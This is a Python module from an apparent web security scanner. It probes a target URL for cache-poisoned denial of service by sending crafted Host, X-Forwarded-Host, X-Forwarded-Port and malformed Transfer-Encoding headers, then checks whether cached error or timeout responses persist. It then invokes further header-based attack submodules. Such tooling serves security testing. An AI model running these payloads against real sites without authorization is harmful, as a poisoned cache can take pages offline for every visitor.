#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from modules.utils import *
from modules.cpdos.cache_error import get_error
from modules.cpdos.waf_rules import waf_rules
from modules.cpdos.hho import HHO
from modules.cpdos.hmc import HMC
from modules.cpdos.hmo import HMO
from modules.cpdos.hhcn import HHCN
from modules.cpdos.hbh import HBH

def check_CPDoS(url, s, req_main, domain, custom_header, authent):
    i = 0
    redirect_req = False

    if req_main.status_code in [301, 302]:
        url = req_main.headers['location'] if "http" in req_main.headers['location'] else "{}{}".format(url, req_main.headers['location'])
    print("\033[36m ├ CPDoS analyse\033[0m")

    url = "{}?CPDoS={}".format(url, random.randint(1, 100), random.randint(1, 100))

    try:
        req_main = requests.get(url, verify=False, allow_redirects=False, timeout=20, auth=authent)
    except:
        pass

    req_len = len(req_main.content)
    main_status_code = req_main.status_code
    
    #print("\033[36m --├ {} [{}] \033[0m".format(url, main_status_code))
    headers = [{"Host": "{}:1234".format(domain)}, {"X-Forwarded-Port":"123"}, {"X-Forwarded-Host": "XXX"}, {"X-Forwarded-Host": "{}:1234".format(domain)}, {"zTRANSFER-ENCODING": "fdvdfe"}]
    for h in headers:
        url = "{}{}".format(url, random.randint(1, 10))
        hit_verify = False
        try:
            req_cpdos = s.get(url, headers=h, verify=False, allow_redirects=False, timeout=20, auth=authent)
            if req_cpdos.status_code in [301, 302, 303, 421, 502, 522]:
                for rc in req_cpdos.headers:
                    if "Cache-Status" in rc or "X-Cache" in rc or "x-drupal-cache" in rc or "X-Proxy-Cache" in rc or "X-HS-CF-Cache-Status" in rc \
                        or "X-Vercel-Cache" in rc or "X-nananana" in rc or "x-vercel-cache" in rc or "X-TZLA-EDGE-Cache-Hit" in rc or "x-spip-cache" in rc \
                        or "x-nextjs-cache" in rc:
                        hit_verify = True
                        #print("  \033[31m └── VULNERABILITY CONFIRMED\033[0m | Timeout with cacheable | \033[34m{}\033[0m | PAYLOAD: {}".format(url, h))
                print("\033[36m └──\033[0m {} + [\033[33m{}\033[0m] → \033[33m{}\033[0m".format(url, h, req_cpdos.status_code))
                if hit_verify:
                    redirect_req = True
                    if "Location" in req_cpdos.headers:
                        for rch in req_cpdos.headers:
                            if rch == "Location":
                                print(" └── Location:  {}".format(req_cpdos.headers[rch]))
                                #return True
                    if redirect_req:
                        print(" --\033[36m├ Check if {} timeout...\033[0m".format(url)) 
                        url_timeout = False
                        n_timout = 0
                        while i != 15:
                            i += 1
                            try:
                                req_cpdos = s.get(url, verify=False, allow_redirects=False, timeout=6)
                                response_time = req_cpdos.elapsed.total_seconds()
                                if response_time > 1.5:
                                    n_timout += 1
                            except requests.exceptions.Timeout:
                                print("   └── \033[31m{} Seems to be timout, CPDos exploit seems to be possible !\033[0m".format(url))
                                url_timeout = True
                        if n_timout > 1:
                            print("   └── \033[33m{} Answered {}/15 at more than 1,5scd, CPDos exploit seems to be possible !\033[0m".format(url, n_timout))
                            url_timeout = True
                        if not url_timeout:
                            print("   └── Not seem timeout, you can check manually if the exploit is possible")
                    else:
                        try:
                            req_cpdos_other_verification = s.get(url, verify=False, allow_redirects=False, timeout=10, auth=authent)
                            if req_cpdos_other_verification.status_code != req_main.status_code:
                                print("   └── Not seem timeout but the page return {} status code with these informations:\n   -URL:{}\n   -HEADER{}, check it manually on {} if this page is down".format(req_cpdos_other_verification.status_code, url, h, url))
                        except:
                            pass
            elif main_status_code != 404 and req_cpdos.status_code == 404:
                req_cpdos_verify = s.get(url, verify=False, allow_redirects=False, timeout=6)
                if req_cpdos_verify.status_code == 404:
                    print("   └── \033[31m{} return 404 answer, CPDos exploit seem to be possible with {} payload !\033[0m".format(url, h))
        except requests.exceptions.Timeout:
            pass
        except KeyboardInterrupt:
            print(" ! Canceled by keyboard interrupt (Ctrl-C)")
            sys.exit() 
        except:
            pass
    try:
        HHO(url, s, main_status_code, authent)
        HMC(url, s, main_status_code, authent)
        HMO(url, s, main_status_code, authent)
        HHCN(url, s, authent)
        HBH(url, s, authent)
        get_error(url, s, main_status_code, authent)
        #waf_rules(url, s, main_status_code, authent)
    except KeyboardInterrupt:
        print(" ! Canceled by keyboard interrupt (Ctrl-C)")
        sys.exit() 
    except:
        #traceback.print_exc()
        pass